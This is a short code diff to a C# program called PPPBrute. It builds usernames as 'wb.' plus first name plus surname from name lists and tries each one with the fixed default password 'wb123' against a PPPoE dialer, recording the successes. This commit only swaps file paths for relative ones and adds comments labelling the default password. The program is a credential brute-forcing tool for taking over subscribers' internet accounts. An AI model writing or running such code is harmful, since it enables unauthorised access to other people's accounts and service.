@@ -10,9 +10,9 @@ namespace PPPBrute
 {
     class Program
     {
-        const string FirstNamesPath = "C:\\Users\\dngad\\Downloads\\hindu-names\\firstnames.txt";
-        const string SurNamesPath = "C:\\Users\\dngad\\Downloads\\hindu-names\\surnames.txt";
-        const string FoundPath = "C:\\Users\\dngad\\Downloads\\hindu-names\\found.txt";
+        const string FirstNamesPath = "firstnames.txt";
+        const string SurNamesPath = "surnames.txt";
+        const string FoundPath = "found.txt";
         private static IEnumerable<string> _firstNames;
         private static IEnumerable<string> _surNames;
         private const string ConnectorName = "PPPoEBrute";
@@ -42,8 +42,8 @@ namespace PPPBrute
             {
                 foreach (var firstname in _firstNames)
                 {
-                    string username = ("wb." + firstname + "." + surname).ToLower();
-                    string password = "wb123";
+                    string username = ("wb." + firstname + "." + surname).ToLower();//common username
+                    string password = "wb123";//Default password
                     try
                     {
                         dialer.Credentials = new NetworkCredential(username, password);
